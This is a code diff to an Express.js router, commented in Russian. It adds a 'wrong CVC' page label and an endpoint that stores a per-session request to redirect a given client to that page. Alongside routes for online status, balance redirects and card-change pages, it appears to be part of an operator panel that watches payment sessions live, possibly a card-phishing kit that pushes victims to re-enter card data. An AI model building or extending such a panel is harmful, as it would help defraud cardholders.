@@ -94,8 +94,8 @@ router.get("/check-online-status/:sessionId", (req, res) => {
     success: "✅ Страница успешной оплаты",
     change: "🔄 Страница изменения карты",
     payment: "💳 Страница оплаты",
+    "wrong-cvc": "❌ Страница неправильного CVC", // Добавляем новую страницу
   };
-
   const currentPageDisplay =
     pageNames[status.currentPage] || `📄 ${status.currentPage}`;
 
@@ -346,6 +346,32 @@ router.post("/redirect-balance", (req, res) => {
 
   console.log(
     `🔄 Redirect request saved for client ${clientId}, session: ${sessionId}`
+  );
+  res.json({ success: true, message: "Redirect request saved" });
+});
+
+router.post("/redirect-wrong-cvc", (req, res) => {
+  const { sessionId, clientId } = req.body;
+
+  if (!sessionId || !clientId) {
+    return res.status(400).json({
+      success: false,
+      error: "sessionId and clientId required",
+    });
+  }
+
+  // Создаем уникальный ключ для клиента + сессии
+  const redirectKey = `${clientId}:${sessionId}`;
+
+  // Сохраняем запрос на перенаправление
+  redirectRequests.set(redirectKey, {
+    type: "wrong-cvc",
+    timestamp: Date.now(),
+    clientId: clientId,
+  });
+
+  console.log(
+    `🔄 Redirect wrong CVC request saved for client ${clientId}, session: ${sessionId}`
   );
   res.json({ success: true, message: "Redirect request saved" });
 });
